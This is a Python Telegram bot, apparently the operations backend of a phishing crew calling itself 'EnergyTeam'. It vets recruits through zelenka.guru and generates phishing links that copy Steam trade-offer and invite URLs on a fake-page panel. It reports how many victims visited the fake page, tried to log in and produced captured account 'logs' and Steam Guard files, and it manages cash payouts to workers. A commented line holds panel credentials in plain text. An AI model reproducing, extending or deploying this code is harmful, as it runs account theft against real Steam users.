import random
import threading
import time
import types

import telebot

import bot_misc.config as cfg
from bot_misc.keyboards import *
import stuk as notif
import panel.methods as methods
import database as db
import sqlite3

bot = telebot.TeleBot(cfg.bot_token)

thread2 = ''

def check_stuk():
    global thread2
    while True:
        try:
            if not thread2.is_alive():
                thread2 = threading.Thread(target=notif.start_stuk)
                thread2.start()
        except:
            continue

def send_log_photo(log_info,path, worker_username):
    bot.send_photo(chat_id=-1001977898074, photo=open(path, 'rb'), caption=f'''новый лог \n🆔 {log_info.get('id')}
 🚀 @{worker_username}''')


def admin_message(text):
    conn = sqlite3.connect('by002.db')
    cursor = conn.cursor()
    cursor.execute(f'SELECT user_id FROM Users')
    row = cursor.fetchall()
    conn.close()
    return row

def exp(message):
    print(f'id: {message.text}')
    bot.send_message(message.chat.id, 'Введи сумму выплаты')
    bot.register_next_step_handler(message, exp2, message.text)

def exp2(message, id):
    print(f'sum: {message.text}')
    bot.send_message(message.chat.id, 'Введи статус')
    bot.register_next_step_handler(message, exp3, id, message.text)

def exp3(message, id, sum):
    print(f'status: {message.text}')
    bot.send_message(message.chat.id, 'Введи ссылку')
    bot.register_next_step_handler(message, exp4, id, sum, message.text)

def exp4(message, id, sum, status):
    print(f'link: {message.text}')

    worker = db.Accounts.select().where(db.Accounts.id == id)[0].user_id
    worker = db.Users.select().where(db.Users.user_id == worker)[0].username

    bot.send_message(cfg.vyplats,
                   f'💸Статус: {status}\n🆔ID : {id}\n🚀Воркер: @{worker}\n🛍Товар: {message.text}\n⚡️Выплата: {sum}')

    #   bot.send_message(cfg.vyplats,
 #                    f'💸Статус: {status}\n🆔ID : {id}\n🚀Воркер: @{worker}\n🛍Товар: {message.text}\n⚡️Выплата: {sum}')


# except Exception as e:
#    print(e)
#    bot.send_message(message.chat.id, 'Что то пошло не так')

@bot.message_handler(commands=['admin'])
def start(message: types.Message):
    if message.chat.id in cfg.admins:
        bot.send_message(message.chat.id, ' {}, вы авторизованы!'.format(message.from_user.first_name),
                         reply_markup=admin_kb)


@bot.message_handler(commands=['start'])
def start(message):
    if message.chat.id < 0:
        return print(message.chat.id)
    elif not message.chat.username:
        return bot.send_message(message.chat.id, "<b>❌ Для пользования ботом установите username.</b>",
                                parse_mode='html')
    elif not db.Users.select().where(db.Users.user_id == message.chat.id).exists():
        db.Users.create(user_id=message.chat.id, username=message.chat.username)
        bot.send_message(message.chat.id, "Добро пожаловать в EnergyTeam!\nПодайте заявку на вступление.",
                         reply_markup=queue_)
    else:
        userinfo = db.Users.select().where(db.Users.user_id == message.chat.id)[0]
        if userinfo.decline:
            return bot.send_message(message.chat.id, "Ваша заявка отклонена.")
        elif userinfo.verifed:
            db.Users.update(username=message.chat.username).where(db.Users.user_id == message.chat.id).execute()

            return bot.send_message(message.chat.id, "Бот перезапущен.", reply_markup=get_user_menu(False))


@bot.message_handler(content_types=['text'])
def dialogue(message: types.Message):
    # if ("/link" in message.text) and (message.chat.id in admins):
    #    username = message.text.split(" ")[1]
    #    link = message.text.split(" ")[2]
    #    #print(username)
    #    info = db.Users.select().where(db.Users.username == username.split("@")[1])[0]
    #    #print(info)
    #
    #    link = link[8:]
    #    #print(link)
    #    # res = s.translate(str.maketrans('', '', chars))
    #    db.Users.update(link=link).where(db.Users.user_id == info.user_id).execute()
    #    bot.send_message(info.user_id, f"Администратор выдал вам ссылку:\n\n https://{link}")
    #    bot.send_message(message.chat.id, f"Ссылка выдана пользователю {username}")

    if not db.Users.select().where(db.Users.user_id == message.chat.id).exists():
        if (message.chat.id not in cfg.admins) or (message.chat.id not in [cfg.payments]):
            return bot.send_message(message.chat.id, "<b>Пропишите /start</b>", parse_mode='html')
    if message.text == "🌐Получить ссылку":
        domains =types.InlineKeyboardMarkup()

        for i in db.Domains.select().dicts():
            domains.add(
                types.InlineKeyboardButton(text = i['name'], callback_data=f'pre_dom_{i["name"]}')
            )

        bot.send_message(message.chat.id, "Выберите домен для генерации ссылки", reply_markup=domains)

        #templates = types.InlineKeyboardMarkup()
        #for i in db.Templates.select().dicts():
        #    templates.add(
        #    types.InlineKeyboardButton(text = i['button_name'], callback_data=f'domain_{i["id"]}')
        #)
        #    print(i)
        #bot.send_message(message.chat.id, "Выберите шаблон для генерации ссылки", reply_markup=templates)


    elif message.text == "👤Профиль":
        userinfo = db.Users.select().where(db.Users.user_id == message.chat.id)[0]
        bot.send_message(message.chat.id, f"🧑‍💻Ваш профиль"
                                          f"\n\nВаш ID: {userinfo.user_id}\n"
                                          f"➖➖➖➖➖➖➖"
                                          f"\nЛогов: {userinfo.logs}\nМафайлов: {userinfo.mafiles}\n"
                                          f"➖➖➖➖➖➖➖\n"
                                          f"Ваш баланс: {userinfo.balance}",
                         reply_markup=profile_kb
                         )

    elif message.text == '/new':
        bot.send_message(message.chat.id, 'Введи id лога гыгы с #')
        bot.register_next_step_handler(message, exp)


    elif message.text == "✅Чаты и Инфа":
        bot.send_message(message.chat.id, "✅Чаты и Инфа:", reply_markup=chats)

    elif message.text == "📲Статистика":
        userinfo = db.Users.select().where(db.Users.user_id == message.chat.id)[0]
        domain_list = types.InlineKeyboardMarkup(row_width=1)
        for i in range(len(userinfo.link.split(' '))):
            domain_list.add(
                types.InlineKeyboardButton(text=userinfo.link.split(' ')[i],
                                           callback_data=f'stat_links|{userinfo.link.split(" ")[i]}')
            )

        bot.send_message(message.chat.id, 'Выберите ссылку по который вы хотите получить статистику',
                         reply_markup=domain_list)

    elif message.text == "🧑‍💻Поддержка":
        bot.send_message(message.chat.id, "Поддержка:", reply_markup=support)


def queue(message):
    question = message.text
    bot.send_message(message.chat.id, "Отправьте ссылку на ваш профиль zelenka.guru:")
    bot.register_next_step_handler(message, queue2, question)


def queue2(message, question):
    if "zelenka.guru" not in message.text:
        bot.send_message(message.chat.id, "Невалидная ссылка!\nПопробуйте еще раз:")
        return bot.register_next_step_handler(message, queue2, question)

    menu = types.InlineKeyboardMarkup()
    menu.add(
        types.InlineKeyboardButton(text="Принять", callback_data=f'accept_{message.chat.id}'),
        types.InlineKeyboardButton(text="Отпидорасить", callback_data=f'decline_{message.chat.id}')
    )

    db.Users.update(lzt=message.text).where(db.Users.user_id == message.chat.id).execute()

    bot.send_message(cfg.admins[0],
                     f"Новая заявка от @{message.chat.username}:\n\nLZT: {message.text}\nОпыт: {question}",
                     reply_markup=menu)
    bot.send_message(message.chat.id, "Заявка отправлена на рассмотрение.")


@bot.callback_query_handler(func=lambda call: True)
def answer(call):
    if call.data == "queue":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        bot.send_message(call.message.chat.id, "Был ли у вас опыт в подобной сфере?")
        bot.register_next_step_handler(call.message, queue)
    elif "decline" in call.data:
        user_id = call.data.split("_")[1]
        db.Users.update(decline=True).where(db.Users.user_id == user_id).execute()
        bot.send_message(user_id, "❌ Ваша заявка была отклонена.")
        bot.delete_message(call.message.chat.id, call.message.message_id)
    elif "accept" in call.data:
        user_id = call.data.split("_")[1]
        db.Users.update(verifed=True).where(db.Users.user_id == user_id).execute()
        bot.send_message(user_id, f"✅ Ваша заявка была принята", reply_markup=get_user_menu(False))
        bot.delete_message(call.message.chat.id, call.message.message_id)

    elif 'pre_dom_' in call.data:
        templates = types.InlineKeyboardMarkup()
        for i in db.Templates.select().dicts():
           templates.add(
           types.InlineKeyboardButton(text = i['button_name'], callback_data=f'domain_{i["id"]}_{call.data.replace("pre_dom_", "")}')
        )
           print(i)
        bot.send_message(call.from_user.id, "Выберите шаблон для генерации ссылки", reply_markup=templates)

    elif 'domain_' in call.data:
        token = methods.login_to_panel(cfg.panel_username, cfg.panel_password)

        path = 'tradeoffer/new/?partner=' if call.data.split('_')[1] == '25428' else 'invite/'

        for i in range(10):
            path += str(random.randint(0, 9))

        if call.data.split('_')[1] == '25428':
            path += '&token=hAcXNNjH'

        link = methods.create_link(token, path, int(call.data.split('_')[1]), call.data.split('_')[2])

        userinfo = db.Users.select().where(db.Users.user_id == call.from_user.id)[0]
        db.Users.update(link=userinfo.link + ' ' + link).where(db.Users.user_id == call.from_user.id).execute()

        bot.edit_message_text(text=f'Ваша ссылка готова!\n\n{link}', chat_id=call.message.chat.id, message_id=call.message.message_id)

    elif "del_link" in call.data:
        link = call.data.split('|')[1]
        info = db.Users.select().where(db.Users.user_id == call.message.chat.id)[0]
        db.Users.update(link=info.link.replace(link, '').replace('  ', ' ')).where(
            db.Users.user_id == call.message.chat.id).execute()
        bot.edit_message_text("Ссылка удалена", chat_id=call.message.chat.id, message_id=call.message.message_id)

    elif "stat_links" in call.data:
        link = call.data.split('|')[1]
        # try:

        bot.edit_message_text('Получаем статистику...', call.message.chat.id, call.message.message_id)
        del_kb = types.InlineKeyboardMarkup(row_width=2)
        del_kb.add(
            types.InlineKeyboardButton(text='Удалить ссылку', callback_data=f'del_link|{link}')
        )
        token = methods.login_to_panel(cfg.panel_username, cfg.panel_password)
        # time.sleep(5)
        stat = methods.get_stat(link, token)
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,
                              text=f"Статистика ссылки <code>{link}:</code>\n\nПосетили фейк: <code>{stat[0] if stat[0] != '' else 0}</code>\nПерешли на авторизацию: <code>{stat[1] if stat[1] != '' else 0}</code>\nПопытались войти: <code>{stat[2] if stat[2] != '' else 0}</code>\nЛогов: <code>{stat[3] if stat[3] != '' else 0}</code>",
                              parse_mode='html', reply_markup=del_kb)
        # except Exception as e:
        #    print(e)
        #    del_kb = types.InlineKeyboardMarkup(row_width=2)
    ##
    #    del_kb.add(
    #        types.InlineKeyboardButton(text='Удалить ссылку', callback_data=f'del_link|{link}')
    #    )
    #    return bot.send_message(call.message.chat.id, "Статистика отсутствует.", reply_markup=del_kb)

    elif 'create_payment_ticket' in call.data:
        userinfo = db.Users.select().where(db.Users.user_id == call.message.chat.id)[0]
        if int(userinfo.balance) <= 0:
            bot.send_message(call.message.chat.id, 'На вашем балансе должно быть больше 0 RUB что бы заказть выплату')
            return
        msg = bot.send_message(call.message.chat.id, 'Введите сумму на которую вы хотите заказать выплату')
        bot.register_next_step_handler(msg, payment_message)

    # elif "domain_" in call.data:
    #    type = call.data.split("_")[1]
    #    print(type)
    #
    #    bot.delete_message(call.message.chat.id, call.message.message_id)
    #    link = ''
    #
    #    if type == 'Конечно':
    #        link = panelAPI.create_link()
    #        bot.send_message(call.message.chat.id, link)
    #
    #    userinfo = db.Users.select().where(db.Users.user_id == call.message.chat.id)[0]
    #    db.Users.update(link=link).where(db.Users.user_id == call.message.chat.id).execute()
    #    print(call.message.chat.id)
    # elif "domain_" in call.data:
    #    #if call.from_user.id == 1993187488 or call.from_user.id == 5136327680 or call.from_user.id == 837121715:
    #    #    return
    #    #type = call.data.split("_")[1]
    #    #bot.delete_message(call.message.chat.id, call.message.message_id)
    #    #bot.send_message(admins[0], f"Заявка на ссылку от @{call.message.chat.username}:\n\nТип: {type}\n\n/link @{call.message.chat.username} steamcommunity.com")
    #    #bot.send_message(call.message.chat.id, "Ваша заявка на ссылку отправлена.", reply_markup=menuUser)
    #    pass

    elif call.data == 'clear_links':
        db.Users.update(link='').where(db.Users.user_id).execute()
        chat_id = call.message.chat.id
        message_id = call.message.message_id
        bot.send_message(chat_id=chat_id, text="Очищено", reply_markup=admin_kb)

    elif call.data == 'find_user':
        msg = bot.send_message(call.message.chat.id, 'Отправь id лога')
        bot.register_next_step_handler(msg, process_find)

    elif call.data == 'message':
        chat_id = call.message.chat.id
        msg = bot.send_message(chat_id=chat_id,
                               text='Введите текст для рассылки. \n\nДля отмены напишите "-" без кавычек!')
        bot.register_next_step_handler(msg, message1)

    elif call.data == 'admadddomain':
        bot.send_message(call.from_user.id, 'Введите домен, пример https://example.com/')

        bot.register_next_step_handler(call.message, add_domain)

    elif call.data == 'admaddshab':
        bot.send_message(call.from_user.id, 'Введите название и id шаблона, Пример fSport_27481')

        bot.register_next_step_handler(call.message, add_template)

    elif 'payment_complete' in call.data:
        value = call.data.split('|')[2]
        userid = call.data.split('|')[1]
        userinfo = db.Users.select().where(db.Users.user_id == userid)[0]
        # Убавляем баланс у пользователя
        db.Users.update(balance=int(userinfo.balance) - int(value)).where(db.Users.user_id == userid).execute()
        bot.edit_message_text(message_id=call.message.message_id, chat_id=call.message.chat.id, text='Выплачено')
        bot.send_message(userid, f'Выплата на {value}RUB была успешно произведена на ваш лолз')

    elif call.data == 'balance_plus':
        msg = bot.send_message(call.message.chat.id,
                               'Введи юзера и балик который плюсануть \n\nПример: IsJameSassh 300')
        bot.register_next_step_handler(msg, bal_plus)

    # elif call.data == 'balance_minus':
    #    msg = bot.send_message(call.message.chat.id, 'Введи юзера и балик который минусануть \n\nПример: k1klis 300')
    #    bot.register_next_step_handler(msg, bal_minus)
    # chat_id = call.message.chat.id
    # message_id = call.message.message_id
    # bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=func.stats(), reply_markup=admin_kb)


def payment_message(message):
    value = int(message.text)
    userinfo = db.Users.select().where(db.Users.user_id == message.chat.id)[0]
    if value <= 0:
        bot.send_message(message.chat.id, 'Нельзя заказать вывод на сумму меньше 1 RUB')
        return
    if value > userinfo.balance:
        bot.send_message(message.chat.id, 'Сумму которую вы указали превышает баланс!')
        return
    userinfo = db.Users.select().where(db.Users.user_id == message.chat.id)[0]
    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(
        types.InlineKeyboardButton(text='Выплачен', callback_data=f'payment_complete|{message.from_user.id}|{value}')
    )
    bot.send_message(cfg.admins[0], '💵Новая заявка на выплату💵\n\n'
                                   f'💵Сумма: {value}\n'
                                   f'👤Юзер: @{message.from_user.username}\n'
                                   f'LZT: {userinfo.lzt}',
                     reply_markup=kb
                     )
    bot.send_message(message.chat.id, 'Заявка на выплату была отправлена\n\n')

def add_domain(message: types.Message):
    domain_name = message.text

    db.Domains.create(name = domain_name)

    bot.send_message(message.chat.id, 'Успешно')


def add_template(message: types.Message):
    name, id = message.text.split('_')

    db.Templates.create(button_name = name, id = id)

    bot.send_message(message.chat.id, 'Успешно')

def message1(message):
    text = message.text
    if message.text.startswith('-'):
        bot.send_message(message.chat.id, text='canel_operation')
    else:
        info = admin_message(text)
        bot.send_message(message.chat.id, text=' Рассылка начата!')
        for i in range(len(info)):
            try:
                time.sleep(1)
                bot.send_message(info[i][0], str(text))
            except:
                pass
        bot.send_message(message.chat.id, text=' Рассылка завершена!')


def bal_plus(message):
    try:
        user = message.text.split(' ')[0]
        to_add = int(message.text.split(' ')[1])
        info = db.Users.select().where(db.Users.username == user)[0]
        db.Users.update(balance=info.balance + to_add).where(db.Users.username == user).execute()
        bot.send_message(info.user_id, f"💸 На ваш баланс было зачислено: {to_add}р")
        bot.send_message(message.chat.id, f"💸 Успешно зачислено {to_add}р")
    except Exception as e:
        print(e)
        bot.send_message(message.chat.id, 'Что то пошло не так')


def process_find(message):
    if db.Accounts.select().where(db.Accounts.id == message.text).exists():
        userid = db.Accounts.select().where(db.Accounts.id == message.text)[0]
        user = db.Users.select().where(db.Users.user_id == userid.user_id)[0]
        bot.send_message(message.chat.id, f'Владелец лога {message.text}, юзер: @{user.username}')
    else:
        bot.send_message(message.chat.id, 'Не смог найти владельца лога')


# @bot.message_handler()
# def answer(message: telebot.types.Message):
#    if message.text == '/link':
#        print('/link')
#        path = 'profiles/'
#
#        for i in range(11):
#            path += str(random.randint(0, 9))
#
#        driver = methods.create_driver()
#        methods.login_to_panel(cfg.panel_username, cfg.panel_password, driver)
#        methods.go_to_domens(driver)
#        link = methods.create_link(driver, path)
#
#        bot.send_message(message.from_user.id, 'Ваша ссылка готова!\n\n' +
#                         link)

# ---- Концепт отстука -----

# elif message.text == '/log':
#    msg = bot.send_message(message.from_user.id, 'Получаем информацию...')

#    driver = methods.create_driver()
#    methods.login_to_panel(cfg.panel_username, cfg.panel_password, driver)
#    log_info = methods.get_last_log(driver)

#    bot.edit_message_text(chat_id=msg.chat.id, message_id=msg.message_id, text='Последний лог в панели:\n\n'
#                                           f'ID: {log_info.get("id")}\n'
#                                           f'Link: {log_info.get("link")}\n'
#                                           f'Balance: {log_info.get("balance")}\n'
#                                           f'Status: {log_info.get("status")}\n'
#                                           f'Level: {log_info.get("level")}')


if __name__ == '__main__':
    db.connect()
    thread1 = threading.Thread(target=bot.infinity_polling)
    thread2 = threading.Thread(target=notif.start_stuk)
    thread3 = threading.Thread(target=check_stuk)
    thread1.start()
    thread2.start()
    thread3.start()

# driver = webdriver.ChromiumEdge()
# driver.get('https://twofish.cc')
# time.sleep(10)
# methods.login_to_panel('yasha1008', 'xrIpPkbP', driver)
# time.sleep(10)
